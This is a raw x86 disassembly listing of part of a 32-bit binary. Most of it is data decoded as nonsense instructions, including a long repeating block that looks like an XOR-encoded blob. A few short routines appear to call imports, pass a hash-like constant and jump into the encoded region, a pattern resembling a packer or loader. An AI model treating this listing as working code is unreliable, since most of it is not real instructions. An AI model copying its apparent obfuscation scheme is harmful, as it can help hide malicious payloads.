  422bb7:	or     BYTE PTR [eax],ah
  422bb9:	stc    
  422bba:	push   ebx
  422bbb:	into   
  422bbc:	mov    ds:0x3a150854,eax
  422bc1:	xchg   edi,eax
  422bc2:	into   
  422bc3:	loope  0x422b4f
  422bc5:	pop    ebp
  422bc6:	xlat   BYTE PTR ds:[ebx]
  422bc7:	lods   al,BYTE PTR ds:[esi]
  422bc8:	(bad)  
  422bc9:	imul   esi,DWORD PTR [eax],0x27d6a35f
  422bcf:	int3   
  422bd0:	js     0x422b67
  422bd2:	sub    DWORD PTR [ecx+0x49],0x681e74de
  422bd9:	pop    ebp
  422bda:	out    dx,eax
  422bdb:	push   esp
  422bdc:	mov    bl,0xd7
  422bde:	nop
  422bdf:	popa   
  422be0:	xlat   BYTE PTR ds:[ebx]
  422be1:	add    al,0x25
  422be3:	add    ebp,DWORD PTR [esi-0x10]
  422be6:	push   edi
  422be7:	push   edx
  422be8:	sti    
  422be9:	dec    eax
  422bea:	js     0x422c35
  422bec:	mov    eax,0xe81a025b
  422bf1:	cmp    BYTE PTR [edx-0x7e],dl
  422bf4:	and    DWORD PTR [ebx-0x48906a4e],esp
  422bfa:	push   esi
  422bfb:	fistp  DWORD PTR [edi+0xc5c6c2]
  422c01:	test   al,0x79
  422c03:	mov    ah,0xc1
  422c05:	xor    bh,BYTE PTR [edx-0x622c3705]
  422c0b:	push   eax
  422c0c:	sar    cl,0x1c
  422c0f:	idiv   DWORD PTR [ebx+0x76]
  422c12:	out    dx,eax
  422c13:	in     al,dx
  422c14:	dec    ebp
  422c15:	push   0x465d446
  422c1a:	ret    
  422c1b:	stos   DWORD PTR es:[edi],eax
  422c1c:	jns    0x422c2e
  422c1e:	push   edi
  422c1f:	sub    DWORD PTR [ebx-0x70362f2d],edx
  422c25:	call   0x2254:0xddd83562
  422c2c:	clc    
  422c2d:	inc    edi
  422c2e:	(bad)  
  422c2f:	mov    bh,0xeb
  422c31:	pop    ds
  422c32:	push   esp
  422c33:	add    esi,DWORD PTR [ecx+0x78]
  422c36:	popa   
  422c37:	scas   al,BYTE PTR es:[edi]
  422c38:	pusha  
  422c39:	and    bl,bh
  422c3b:	xchg   ecx,eax
  422c3c:	arpl   WORD PTR [edi+0xb],si
  422c3f:	movsx  esp,WORD PTR [edx+edi*2]
  422c43:	pop    esi
  422c44:	fcmovbe st,st(5)
  422c46:	cmp    ah,cl
  422c48:	in     eax,0x6c
  422c4a:	jno    0x422be7
  422c4c:	test   DWORD PTR [eax-0x318afd6e],0xadd5795b
  422c56:	fist   WORD PTR [edx+0x7b935a27]
  422c5c:	cs mov ebx,0x29cf8da4
  422c62:	lea    esp,[eax]
  422c64:	nop
  422c65:	mov    edi,0xac34c6fc
  422c6a:	mov    al,ds:0x85bbe583
  422c6f:	lods   al,BYTE PTR ds:[esi]
  422c70:	adc    DWORD PTR [ebx+0x6a8316b1],edi
  422c76:	sbb    al,BYTE PTR [ebx]
  422c78:	retf   
  422c79:	fxch   st(5)
  422c7b:	in     eax,dx
  422c7c:	mov    esi,0xedeb9e7b
  422c81:	mul    DWORD PTR [esi-0x56d7180c]
  422c87:	fnstcw WORD PTR [ebx-0x656ee53c]
  422c8d:	inc    ecx
  422c8e:	ret    
  422c8f:	fist   WORD PTR [edx]
  422c91:	lea    esp,ds:0xdb35c7c0
  422c97:	mov    eax,ds:0x329612b9
  422c9c:	call   esp
  422c9e:	mov    ss,WORD PTR [edi+0x280fdaa3]
  422ca4:	out    0x6b,al
  422ca6:	test   BYTE PTR [esi+0x4a776495],dh
  422cac:	pusha  
  422cad:	jno    0x422cdb
  422caf:	call   0xd5331490
  422cb4:	in     al,dx
  422cb5:	(bad)  
  422cb6:	xor    edi,DWORD PTR [edi]
  422cb8:	xor    cl,al
  422cba:	call   0x51f6:0xa228c946
  422cc1:	and    eax,0xe981b3d7
  422cc6:	shl    eax,0x29
  422cc9:	mov    eax,0x4aae6340
  422cce:	mov    ah,bh
  422cd0:	mov    ch,0x7a
  422cd2:	js     0x422d0b
  422cd4:	adc    cl,BYTE PTR [esi+0x78]
  422cd7:	cmc    
  422cd8:	cwde   
  422cd9:	ins    DWORD PTR es:[edi],dx
  422cda:	test   al,0xb6
  422cdc:	jecxz  0x422ccd
  422cde:	jns    0x422d25
  422ce0:	xchg   esp,eax
  422ce1:	rcl    ah,1
  422ce3:	sbb    al,0xc5
  422ce5:	pop    esi
  422ce6:	rcr    DWORD PTR [edi+eax*8],cl
  422ce9:	cmp    dl,cl
  422ceb:	xchg   edx,eax
  422cec:	push   edx
  422ced:	imul   eax,ecx,0x61cbb296
  422cf3:	mov    esp,0x2aa63777
  422cf8:	sub    DWORD PTR [edx],edx
  422cfa:	push   0xffffff9b
  422cfc:	loopne 0x422d58
  422cfe:	sbb    al,0xda
  422d00:	mov    esi,0x433bc369
  422d05:	jno    0x422d11
  422d07:	rcl    DWORD PTR [esi],0x65
  422d0a:	lods   eax,DWORD PTR es:[esi]
  422d0c:	jnp    0x422d8b
  422d0e:	mov    ebx,DWORD PTR [edi]
  422d10:	sbb    BYTE PTR [edi+eax*2+0x230c9296],0x7a
  422d18:	fsubrp st(0),st
  422d1a:	das    
  422d1b:	shl    BYTE PTR [eax-0x535f2167],cl
  422d21:	nop
  422d22:	(bad)  
  422d23:	shl    BYTE PTR [ebx-0x293820a6],0xf6
  422d2a:	xchg   esi,eax
  422d2b:	clc    
  422d2c:	jmp    0x3be379a5
  422d31:	popf   
  422d32:	xchg   ebx,eax
  422d33:	fstp   QWORD PTR [edx]
  422d35:	xchg   esi,eax
  422d36:	push   cs
  422d37:	cli    
  422d38:	pop    esi
  422d39:	adc    DWORD PTR [ebp-0x71],ebx
  422d3c:	push   edx
  422d3d:	push   ds
  422d3e:	jg     0x422da7
  422d40:	shr    BYTE PTR ds:0x83612c79,cl
  422d46:	imul   edx,DWORD PTR [edi],0xffffffe0
  422d49:	nop
  422d4a:	je     0x422d15
  422d4c:	mov    al,ds:0x4e79e654
  422d51:	add    al,0x3
  422d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d54:	inc    eax
  422d55:	inc    edi
  422d56:	clc    
  422d57:	retf   0x68ad
  422d5a:	sar    DWORD PTR [esi],0x4e
  422d5d:	pop    es
  422d5e:	test   edx,eax
  422d60:	(bad)  
  422d61:	inc    edx
  422d62:	jle    0x422cf8
  422d64:	adc    esp,DWORD PTR [edi]
  422d66:	jp     0x422d2d
  422d68:	in     eax,dx
  422d69:	data16 jl 0x422d3c
  422d6c:	xlat   BYTE PTR ds:[ebx]
  422d6d:	dec    esi
  422d6e:	mov    ebx,0xa32cd835
  422d73:	or     bl,BYTE PTR [edx-0x70dd96af]
  422d79:	mov    ecx,0xb119daa4
  422d7e:	fist   DWORD PTR ds:0x2f6f249d
  422d84:	xchg   bh,ch
  422d86:	mov    dl,0x13
  422d88:	mov    dh,0x9e
  422d8a:	fmul   DWORD PTR [esi+ebx*8+0x23f2ae6d]
  422d91:	outs   dx,DWORD PTR ds:[esi]
  422d92:	inc    edi
  422d93:	inc    DWORD PTR [esi-0x1a]
  422d96:	pop    esi
  422d97:	in     al,0x57
  422d99:	ins    DWORD PTR es:[edi],dx
  422d9a:	jno    0x422d27
  422d9c:	and    BYTE PTR [edx],bl
  422d9e:	fwait
  422d9f:	inc    DWORD PTR [ecx-0x3d]
  422da2:	push   es
  422da3:	call   0x14ce:0x3de148d4
  422daa:	lods   eax,DWORD PTR ds:[esi]
  422dab:	xchg   edi,eax
  422dac:	retf   
  422dad:	std    
  422dae:	pushf  
  422daf:	pop    ss
  422db0:	jo     0x422de2
  422db2:	mov    edx,0x9bac8e3f
  422db7:	adc    BYTE PTR [ecx-0x6d],0xd5
  422dbb:	mov    edi,0xd1ee48e5
  422dc0:	xlat   BYTE PTR ds:[ebx]
  422dc1:	xor    ebp,DWORD PTR [edx-0x29cb6c27]
  422dc7:	(bad)  
  422dc8:	out    dx,eax
  422dc9:	retf   0x5a3c
  422dcc:	cwde   
  422dcd:	and    eax,0x90517b44
  422dd2:	sbb    eax,0x88f5e47a
  422dd7:	mov    ebx,0xd1c758f5
  422ddc:	push   ds
  422ddd:	fsubr  DWORD PTR [ecx+0x1e]
  422de0:	or     dl,BYTE PTR [esi-0x7ab4210b]
  422de6:	pusha  
  422de7:	sbb    BYTE PTR [ebp+0x4e3cb65d],0x2e
  422dee:	shl    DWORD PTR [esi-0x2f],1
  422df1:	adc    bl,BYTE PTR [edi-0x26]
  422df4:	jns    0x422dae
  422df6:	in     eax,0x1f
  422df8:	xchg   ebx,eax
  422df9:	int3   
  422dfa:	rcr    BYTE PTR [ecx+0x3992cd4f],cl
  422e00:	cwde   
  422e01:	mov    DWORD PTR [edx-0x59e790ab],esi
  422e07:	retf   0xde51
  422e0a:	cmc    
  422e0b:	gs int3 
  422e0d:	pop    edi
  422e0e:	loope  0x422e3e
  422e10:	pushf  
  422e11:	inc    edi
  422e12:	mov    bl,0xcf
  422e14:	retf   0xca4f
  422e17:	test   al,0xc6
  422e19:	out    dx,eax
  422e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e1b:	xchg   edi,eax
  422e1c:	popa   
  422e1d:	popa   
  422e1e:	repz mov ecx,0x8352aabb
  422e24:	cmc    
  422e25:	sahf   
  422e26:	ror    DWORD PTR [ebx+0x38abe4f8],cl
  422e2c:	push   esp
  422e2d:	pop    esi
  422e2e:	jp     0x422dbc
  422e30:	cdq    
  422e31:	sub    eax,0xdda01a94
  422e36:	lock enter 0x219a,0x60
  422e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e3c:	xchg   edx,eax
  422e3d:	imul   ecx,esi,0xfffffff3
  422e40:	leave  
  422e41:	adc    eax,0x8ce743ac
  422e46:	push   0x847e0a24
  422e4b:	ss pop ss
  422e4d:	scas   eax,DWORD PTR es:[edi]
  422e4e:	push   ecx
  422e4f:	jg     0x422e32
  422e51:	add    BYTE PTR ss:[eax],dh
  422e54:	jge    0x422dfe
  422e56:	mov    dh,0x39
  422e58:	cmp    ecx,DWORD PTR [edi-0x7a5d9dc2]
  422e5e:	daa    
  422e5f:	jne    0x422e23
  422e61:	repz sbb BYTE PTR [eax+0x20af30ac],bh
  422e68:	or     esp,DWORD PTR [edi+0x45]
  422e6b:	imul   ebp,DWORD PTR [ebx],0xffffff87
  422e6e:	ret    
  422e6f:	pop    esp
  422e70:	xor    eax,0x588a9069
  422e75:	cli    
  422e76:	aad    0x7a
  422e78:	fucomip st,st(7)
  422e7a:	push   ecx
  422e7b:	cli    
  422e7c:	push   edx
  422e7d:	dec    esp
  422e7e:	fisubr DWORD PTR [esi]
  422e80:	std    
  422e81:	dec    edx
  422e82:	rol    dl,cl
  422e84:	jnp    0x422e6d
  422e86:	and    al,0xde
  422e88:	pop    ecx
  422e89:	mov    ebx,0x6203355e
  422e8e:	lahf   
  422e8f:	fisub  DWORD PTR [ecx+0x1d]
  422e92:	add    al,0xf4
  422e94:	pop    ecx
  422e95:	retf   0x83d
  422e98:	mov    ch,0xf
  422e9a:	sar    DWORD PTR [ebx],cl
  422e9c:	int3   
  422e9d:	mul    BYTE PTR [eax+0x37f32134]
  422ea3:	pop    edi
  422ea4:	retf   0x8400
  422ea7:	daa    
  422ea8:	cmp    eax,0xc0d8f530
  422ead:	jno    0x422eb9
  422eaf:	not    DWORD PTR [ebx]
  422eb1:	stos   BYTE PTR es:[edi],al
  422eb2:	cld    
  422eb3:	mov    esi,0xe2713236
  422eb8:	sbb    eax,0xdb200f15
  422ebd:	(bad)  
  422ebe:	mov    cl,0xae
  422ec0:	repz add al,0x12
  422ec3:	outs   dx,BYTE PTR ds:[esi]
  422ec4:	out    dx,al
  422ec5:	addr16 je 0x422e97
  422ec8:	push   esi
  422ec9:	cmp    edi,DWORD PTR [edx-0x14ad6a51]
  422ecf:	daa    
  422ed0:	int3   
  422ed1:	arpl   ax,bp
  422ed3:	mov    bh,0x74
  422ed5:	sub    eax,0x673cb549
  422eda:	in     al,dx
  422edb:	pop    ebp
  422edc:	fsub   DWORD PTR [edx+0xc]
  422edf:	sub    esp,eax
  422ee1:	and    ecx,ebx
  422ee3:	add    ebp,ebp
  422ee5:	xchg   esp,edx
  422ee7:	sti    
  422ee8:	xchg   esp,eax
  422ee9:	pop    ebx
  422eea:	cs retf 
  422eec:	xchg   ebx,eax
  422eed:	mov    ds:0x43f7b571,eax
  422ef2:	rcl    esp,0x4f
  422ef5:	xchg   ebp,eax
  422ef6:	xchg   esi,eax
  422ef7:	fsub   QWORD PTR [ebx+0x30797b67]
  422efd:	or     dl,BYTE PTR [ebp+esi*2-0x2960cfa3]
  422f04:	push   ds
  422f05:	daa    
  422f06:	gs push cs
  422f08:	mov    eax,0x2c142824
  422f0d:	dec    ecx
  422f0e:	ds ss out dx,al
  422f11:	or     eax,0xdc32d7ff
  422f16:	icebp  
  422f17:	(bad)  
  422f18:	xchg   ecx,eax
  422f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f1a:	push   edx
  422f1b:	jl     0x422f4e
  422f1d:	mov    eax,0x1
  422f22:	mov    esp,ebp
  422f24:	pop    ebp
  422f25:	ret    
  422f26:	int3   
  422f27:	int3   
  422f28:	int3   
  422f29:	int3   
  422f2a:	int3   
  422f2b:	int3   
  422f2c:	int3   
  422f2d:	int3   
  422f2e:	int3   
  422f2f:	int3   
  422f30:	push   ebp
  422f31:	mov    ebp,esp
  422f33:	sub    esp,0x8
  422f36:	mov    eax,ds:0x429044
  422f3b:	push   esi
  422f3c:	push   0x0
  422f3e:	push   0x4e
  422f40:	push   0x1e
  422f42:	push   0x0
  422f44:	push   0xffffffff
  422f46:	mov    DWORD PTR [ebp-0x4],0x0
  422f4d:	mov    DWORD PTR [ebp-0x8],eax
  422f50:	call   DWORD PTR ds:0x429038
  422f56:	mov    esi,DWORD PTR [ebp-0x8]
  422f59:	call   esi
  422f5b:	mov    DWORD PTR [ebp-0x4],eax
  422f5e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f62:	jne    0x422f71
  422f64:	push   0x65dcdfc9
  422f69:	call   0x4111f0
  422f6e:	add    esp,0x4
  422f71:	xor    eax,eax
  422f73:	pop    esi
  422f74:	mov    esp,ebp
  422f76:	pop    ebp
  422f77:	ret    
  422f78:	nop
  422f79:	nop
  422f7a:	nop
  422f7b:	nop
  422f7c:	nop
  422f7d:	nop
  422f7e:	nop
  422f7f:	nop
  422f80:	sub    esp,0x10
  422f83:	push   0x0
  422f85:	push   0x0
  422f87:	push   0x0
  422f89:	call   DWORD PTR ds:0x429034
  422f8f:	lea    eax,[esp+0x0]
  422f93:	push   eax
  422f94:	call   DWORD PTR ds:0x42903c
  422f9a:	cmp    WORD PTR [esp+0x0],0x0
  422fa0:	je     0x422fc2
  422fa2:	push   0x0
  422fa4:	call   0x422f30
  422fa9:	add    esp,0x4
  422fac:	call   0x411000
  422fb1:	push   0x0
  422fb3:	push   0x0
  422fb5:	call   0x424400
  422fba:	xor    eax,eax
  422fbc:	add    esp,0x10
  422fbf:	ret    0x10
  422fc2:	jmp    FWORD PTR ds:0x3d70da6f
  422fc8:	dec    edx
  422fc9:	loope  0x422faa
  422fcb:	(bad)  
  422fcc:	push   edx
  422fcd:	jl     0x422f68
  422fcf:	push   0xffffff9f
  422fd1:	xor    eax,0x4a3ec84a
  422fd6:	loope  0x422fb7
  422fd8:	cli    
  422fd9:	push   edx
  422fda:	jl     0x422fb5
  422fdc:	xchg   ebp,eax
  422fdd:	pusha  
  422fde:	xor    eax,0x4a3e704a
  422fe3:	loope  0x422fc4
  422fe5:	cli    
  422fe6:	push   edx
  422fe7:	jl     0x422f82
  422fe9:	xchg   ebp,eax
  422fea:	pusha  
  422feb:	xor    eax,0x4a3e704a
  422ff0:	loope  0x422fd1
  422ff2:	cli    
  422ff3:	push   edx
  422ff4:	jl     0x422f8f
  422ff6:	xchg   ebp,eax
  422ff7:	pusha  
  422ff8:	xor    eax,0x4a3e704a
  422ffd:	loope  0x422fde
  422fff:	add    dl,BYTE PTR [edx+0x7c]
  423002:	cdq    
  423003:	fwait
  423004:	jg     0x422f95
  423006:	inc    esp
  423007:	jo     0x422f93
  423009:	inc    ebx
  42300a:	sub    al,0xfe
  42300c:	inc    edx
  42300d:	push   ebx
  42300e:	xor    BYTE PTR [esp+esi*4+0x34],dl
  423012:	pop    ebp
  423013:	and    eax,DWORD PTR [ebx]
  423015:	push   ds
  423016:	cmp    dl,BYTE PTR [ebx+0x1d209db0]
  42301c:	hlt    
  42301d:	mov    ch,0x3
  42301f:	push   esp
  423020:	and    al,0x1e
  423022:	push   ecx
  423023:	sar    DWORD PTR ds:[ebp-0x13f18d61],0xfb
  42302b:	inc    eax
  42302c:	pop    esp
  42302d:	and    al,0x50
  42302f:	jp     0x423036
  423031:	mov    dl,0xff
  423033:	xchg   edi,eax
  423034:	cmp    eax,0x6dbbfc18
  423039:	cmp    BYTE PTR [eax+0x54],al
  42303c:	ds dec edx
  42303e:	loope  0x42301f
  423040:	cli    
  423041:	push   edx
  423042:	jl     0x422fe2
  423044:	or     al,0x9c
  423046:	ins    BYTE PTR es:[edi],dx
  423047:	or     DWORD PTR [eax+0x27a240ac],ecx
  42304d:	push   0x7613f58
  423052:	push   0x6d
  423054:	das    
  423055:	jl     0x42308b
  423057:	adc    eax,0xaf04d19
  42305c:	sbb    DWORD PTR [ecx-0x27325d61],esp
  423062:	jp     0x4230ca
  423064:	das    
  423065:	fcom   st(5)
  423067:	xchg   edx,eax
  423068:	stos   BYTE PTR es:[edi],al
  423069:	out    dx,al
  42306a:	xchg   ebx,eax
  42306b:	mov    ecx,0x36400cee
  423070:	(bad)  
  423071:	fsubr  st,st(3)
  423073:	xchg   ebp,eax
  423074:	jp     0x4230b9
  423076:	jbe    0x42304b
  423078:	ins    DWORD PTR es:[edi],dx
  423079:	repnz aas 
  42307b:	add    al,dh
  42307d:	aas    
  42307e:	inc    eax
  42307f:	mov    ecx,0x3f586827
  423084:	popa   
  423085:	push   es
  423086:	push   0x1d
  423088:	mov    bl,0xe2
  42308a:	xor    al,0xf5
  42308c:	cmp    DWORD PTR [edi-0x10],ebx
  42308f:	pop    ds
  423090:	test   BYTE PTR [ebx],cl
  423092:	lahf   
  423093:	cmp    BYTE PTR [eax+0x77],dl
  423096:	jp     0x4230ce
  423098:	mov    dl,0x73
  42309a:	aad    0xa2
  42309c:	aaa    
  42309d:	je     0x423032
  42309f:	xlat   BYTE PTR ds:[ebx]
  4230a0:	cwde   
  4230a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230a2:	inc    eax
  4230a3:	sub    BYTE PTR [ebx+0x45],bl
  4230a6:	jmp    0x423045
  4230a8:	add    al,al
  4230aa:	jbe    0x423077
  4230ac:	cld    
  4230ad:	add    ebx,DWORD PTR [ebp+0x9]
  4230b0:	mov    BYTE PTR [eax+eax*2+0x52fadfe1],ch
  4230b7:	jl     0x423052
  4230b9:	xchg   ebp,eax
  4230ba:	pusha  
  4230bb:	pshufw mm7,QWORD PTR gs:[esi],0x6
  4230c0:	loopne 0x42309f
  4230c2:	cli    
  4230c3:	mov    esi,0x60dac69f
  4230c8:	xor    eax,0x4a3e704a
  4230cd:	loope  0x4230ae
  4230cf:	sbb    dl,BYTE PTR [edx+0x7f]
  4230d2:	cwde   
  4230d3:	sahf   
  4230d4:	popa   
  4230d5:	aas    
  4230d6:	dec    edx
  4230d7:	jo     0x4230ab
  4230d9:	dec    esi
  4230da:	loope  0x4230bb
  4230dc:	(bad)  
  4230dd:	push   esp
  4230de:	jl     0x423079
  4230e0:	xchg   ebp,eax
  4230e1:	pusha  
  4230e2:	xor    eax,0x4a3ecd4b
  4230e7:	loope  0x4230b8
  4230e9:	cli    
  4230ea:	push   edx
  4230eb:	jl     0x423086
  4230ed:	nop
  4230ee:	pusha  
  4230ef:	xor    eax,0x4a3e314a
  4230f4:	icebp  
  4230f5:	(bad)  
  4230f7:	push   edx
  4230f8:	jle    0x423093
  4230fa:	xchg   ebp,eax
  4230fb:	gs xor eax,0x4a3e704b
  423101:	loope  0x4230e2
  423103:	call   DWORD PTR [edx+0x7d]
  423106:	cdq    
  423107:	xchg   ebp,eax
  423108:	pusha  
  423109:	xor    eax,0x41be704a
  42310e:	loope  0x4230ef
  423110:	(bad)  
  423111:	push   edx
  423112:	jl     0x423138
  423114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423115:	gs xor eax,0xca3e7048
  42311b:	loope  0x4230fc
  42311d:	jmp    0x3560:0x95897c52
  423124:	dec    edx
  423125:	pusha  
  423126:	ds dec edx
  423128:	icebp  
  423129:	(bad)  
  42312b:	push   edx
  42312c:	jl     0x4230c7
  42312e:	xchg   ebp,eax
  42312f:	jo     0x423166
  423131:	dec    edx
  423132:	jo     0x423172
  423134:	dec    edx
  423135:	loope  0x423116
  423137:	cli    
  423138:	push   edx
  423139:	jl     0x4230d4
  42313b:	adc    DWORD PTR [esi],ecx
  42313d:	ds dec edx
  42313f:	sbb    DWORD PTR ds:0xcadfe14a,edi
  423145:	pop    ecx
  423146:	jl     0x42319e
  423148:	test   al,0x60
  42314a:	xor    eax,0x4a3e704a
  42314f:	loope  0x423130
  423151:	cli    
  423152:	push   edx
  423153:	jl     0x4230ee
  423155:	xchg   ebp,eax
  423156:	pusha  
  423157:	xor    eax,0x4a3e704a
  42315c:	loope  0x42313d
  42315e:	cli    
  42315f:	push   edx
  423160:	jl     0x4230fb
  423162:	xchg   ebp,eax
  423163:	pusha  
  423164:	xor    eax,0x4a3e704a
  423169:	loope  0x42314a
  42316b:	cli    
  42316c:	push   edx
  42316d:	jl     0x423108
  42316f:	xchg   ebp,eax
  423170:	pusha  
  423171:	xor    eax,0x4a3e704a
  423176:	loope  0x423157
  423178:	cli    
  423179:	push   edx
  42317a:	jl     0x423115
  42317c:	xchg   ebp,eax
  42317d:	pusha  
  42317e:	xor    eax,0x4a3e704a
  423183:	loope  0x423164
  423185:	cli    
  423186:	push   edx
  423187:	jl     0x423122
  423189:	xchg   ebp,eax
  42318a:	pusha  
  42318b:	xor    eax,0x4a3e704a
  423190:	loope  0x423171
  423192:	cli    
  423193:	push   edx
  423194:	jl     0x42312f
  423196:	xchg   ebp,eax
  423197:	pusha  
  423198:	xor    eax,0x4a3e704a
  42319d:	loope  0x42317e
  42319f:	cli    
  4231a0:	push   edx
  4231a1:	jl     0x42313c
  4231a3:	xchg   ebp,eax
  4231a4:	pusha  
  4231a5:	xor    eax,0x4a3e704a
  4231aa:	loope  0x42318b
  4231ac:	cli    
  4231ad:	push   edx
  4231ae:	jl     0x423149
  4231b0:	xchg   ebp,eax
  4231b1:	pusha  
  4231b2:	xor    eax,0x325b0464
  4231b7:	xchg   ebp,eax
  4231b8:	(bad)  
  4231ba:	push   edx
  4231bb:	jl     0x423176
  4231bd:	sahf   
  4231be:	pusha  
  4231bf:	xor    eax,0x4a3e705a
  4231c4:	fcmovnu st,st(3)
  4231c6:	cli    
  4231c7:	push   edx
  4231c8:	js     0x423163
  4231ca:	xchg   ebp,eax
  4231cb:	xor    BYTE PTR [eax+0x9],dh
  4231ce:	inc    edx
  4231cf:	push   0x5
  4231d1:	loope  0x4231b2
  4231d3:	cli    
  4231d4:	push   edx
  4231d5:	jl     0x423170
  4231d7:	mov    ch,0x60
  4231d9:	xor    eax,0x394c5eaa
  4231de:	xchg   ebx,eax
  4231df:	mov    esp,0x997c52fa
  4231e4:	lds    esp,FWORD PTR [eax+0x35]
  4231e7:	dec    edx
  4231e8:	inc    eax
  4231e9:	xor    eax,0xfa8fe14a
  4231ee:	push   edx
  4231ef:	jl     0x423198
  4231f1:	xchg   ecx,eax
  4231f2:	pusha  
  4231f3:	xor    eax,0x4a3e704a
  4231f8:	loope  0x4231d9
  4231fa:	cli    
  4231fb:	push   edx
  4231fc:	jl     0x423197
  4231fe:	xchg   ebp,eax
  4231ff:	inc    eax
  423200:	xor    eax,0x4a3e904a
  423205:	loope  0x4231e6
  423207:	cli    
  423208:	push   edx
  423209:	jl     0x4231a4
  42320b:	xchg   ebp,eax
  42320c:	pusha  
  42320d:	xor    eax,0x4a3e704a
  423212:	loope  0x4231f3
  423214:	cli    
  423215:	push   edx
  423216:	jl     0x4231b1
  423218:	xchg   ebp,eax
  423219:	pusha  
  42321a:	xor    eax,0x4a3e704a
  42321f:	loope  0x423200
  423221:	cli    
  423222:	push   edx
  423223:	jl     0x4231be
  423225:	xchg   ebp,eax
  423226:	pusha  
  423227:	xor    eax,0x4a3e704a
  42322c:	loope  0x42320d
  42322e:	cli    
  42322f:	push   edx
  423230:	jl     0x4231cb
  423232:	xchg   ebp,eax
  423233:	pusha  
  423234:	xor    eax,0x4a3e704a
  423239:	loope  0x42321a
  42323b:	cli    
  42323c:	push   edx
  42323d:	jl     0x4231d8
  42323f:	xchg   ebp,eax
  423240:	pusha  
  423241:	xor    eax,0x4a3e704a
  423246:	loope  0x423227
  423248:	cli    
  423249:	push   edx
  42324a:	jl     0x4231e5
  42324c:	xchg   ebp,eax
  42324d:	pusha  
  42324e:	xor    eax,0x4a3e704a
  423253:	loope  0x423234
  423255:	cli    
  423256:	push   edx
  423257:	jl     0x4231f2
  423259:	xchg   ebp,eax
  42325a:	pusha  
  42325b:	xor    eax,0x4a3e704a
  423260:	loope  0x423241
  423262:	cli    
  423263:	push   edx
  423264:	jl     0x4231ff
  423266:	xchg   ebp,eax
  423267:	pusha  
  423268:	xor    eax,0x4a3e704a
  42326d:	loope  0x42324e
  42326f:	cli    
  423270:	push   edx
  423271:	jl     0x42320c
  423273:	xchg   ebp,eax
  423274:	pusha  
  423275:	xor    eax,0x4a3e704a
  42327a:	loope  0x42325b
  42327c:	cli    
  42327d:	push   edx
  42327e:	jl     0x423219
  423280:	xchg   ebp,eax
  423281:	pusha  
  423282:	xor    eax,0x4a3e704a
  423287:	loope  0x423268
  423289:	cli    
  42328a:	push   edx
  42328b:	jl     0x423226
  42328d:	xchg   ebp,eax
  42328e:	pusha  
  42328f:	xor    eax,0x4a3e704a
  423294:	loope  0x423275
  423296:	cli    
  423297:	push   edx
  423298:	jl     0x423233
  42329a:	xchg   ebp,eax
  42329b:	pusha  
  42329c:	xor    eax,0x4a3e704a
  4232a1:	loope  0x423282
  4232a3:	cli    
  4232a4:	push   edx
  4232a5:	jl     0x423240
  4232a7:	xchg   ebp,eax
  4232a8:	pusha  
  4232a9:	xor    eax,0x4a3e704a
  4232ae:	loope  0x42328f
  4232b0:	cli    
  4232b1:	push   edx
  4232b2:	jl     0x42324d
  4232b4:	xchg   ebp,eax
  4232b5:	pusha  
  4232b6:	xor    eax,0x4a3e704a
  4232bb:	loope  0x42329c
  4232bd:	cli    
  4232be:	push   edx
  4232bf:	jl     0x42325a
  4232c1:	xchg   ebp,eax
  4232c2:	pusha  
  4232c3:	xor    eax,0x4a3e704a
  4232c8:	loope  0x4232a9
  4232ca:	cli    
  4232cb:	push   edx
  4232cc:	jl     0x423267
  4232ce:	xchg   ebp,eax
  4232cf:	pusha  
  4232d0:	xor    eax,0x4a3e704a
  4232d5:	loope  0x4232b6
  4232d7:	cli    
  4232d8:	push   edx
  4232d9:	jl     0x423274
  4232db:	xchg   ebp,eax
  4232dc:	pusha  
  4232dd:	xor    eax,0x4a3e704a
  4232e2:	loope  0x4232c3
  4232e4:	cli    
  4232e5:	push   edx
  4232e6:	jl     0x423281
  4232e8:	xchg   ebp,eax
  4232e9:	pusha  
  4232ea:	xor    eax,0x4a3e704a
  4232ef:	loope  0x4232d0
  4232f1:	cli    
  4232f2:	push   edx
  4232f3:	jl     0x42328e
  4232f5:	xchg   ebp,eax
  4232f6:	pusha  
  4232f7:	xor    eax,0x4a3e704a
  4232fc:	loope  0x4232dd
  4232fe:	cli    
  4232ff:	push   edx
  423300:	jl     0x42329b
  423302:	xchg   ebp,eax
  423303:	pusha  
  423304:	xor    eax,0x4a3e704a
  423309:	loope  0x4232ea
  42330b:	cli    
  42330c:	push   edx
  42330d:	jl     0x4232a8
  42330f:	xchg   ebp,eax
  423310:	pusha  
  423311:	xor    eax,0x4a3e704a
  423316:	loope  0x4232f7
  423318:	cli    
  423319:	push   edx
  42331a:	jl     0x4232b5
  42331c:	xchg   ebp,eax
  42331d:	pusha  
  42331e:	xor    eax,0x4a3e704a
  423323:	loope  0x423304
  423325:	cli    
  423326:	push   edx
  423327:	jl     0x4232c2
  423329:	xchg   ebp,eax
  42332a:	pusha  
  42332b:	xor    eax,0x4a3e704a
  423330:	loope  0x423311
  423332:	cli    
  423333:	push   edx
  423334:	jl     0x4232cf
  423336:	xchg   ebp,eax
  423337:	pusha  
  423338:	xor    eax,0x4a3e704a
  42333d:	loope  0x42331e
  42333f:	cli    
  423340:	push   edx
  423341:	jl     0x4232dc
  423343:	xchg   ebp,eax
  423344:	pusha  
  423345:	xor    eax,0x4a3e704a
  42334a:	loope  0x42332b
  42334c:	cli    
  42334d:	push   edx
  42334e:	jl     0x4232e9
  423350:	xchg   ebp,eax
  423351:	pusha  
  423352:	xor    eax,0x4a3e704a
  423357:	loope  0x423338
  423359:	cli    
  42335a:	push   edx
  42335b:	jl     0x4232f6
  42335d:	xchg   ebp,eax
  42335e:	pusha  
  42335f:	xor    eax,0x4a3e704a
  423364:	loope  0x423345
  423366:	cli    
  423367:	push   edx
  423368:	jl     0x423303
  42336a:	xchg   ebp,eax
  42336b:	pusha  
  42336c:	xor    eax,0x4a3e704a
  423371:	loope  0x423352
  423373:	cli    
  423374:	push   edx
  423375:	jl     0x423310
  423377:	xchg   ebp,eax
  423378:	pusha  
  423379:	xor    eax,0x4a3e704a
  42337e:	loope  0x42335f
  423380:	cli    
  423381:	push   edx
